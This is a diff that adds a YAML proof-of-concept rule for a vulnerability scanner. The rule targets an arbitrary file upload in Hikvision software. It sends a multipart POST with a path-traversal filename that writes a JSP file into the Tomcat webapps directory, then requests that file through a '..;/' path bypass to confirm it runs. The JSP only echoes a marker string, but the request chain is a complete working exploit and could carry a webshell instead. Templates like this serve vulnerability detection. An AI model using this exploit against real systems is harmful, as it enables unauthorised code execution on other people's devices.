@@ -1,0 +1,34 @@
+name: poc-yaml-hikvision-files-upload
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /svm/api/external/report
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+      body: "\
+        ------WebKitFormBoundary9PggsiM755PLa54a\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\"\r\n\
+        Content-Type: application/zip\r\n\
+        \r\n\
+        <%out.print(\"pboyjnnrfipmplsukdeczudsefxmywex\");%>\r\n\
+        ------WebKitFormBoundary9PggsiM755PLa54a--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /portal/ui/login/..;/..;/new.jsp
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywex')
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139061985
+
+
+
+
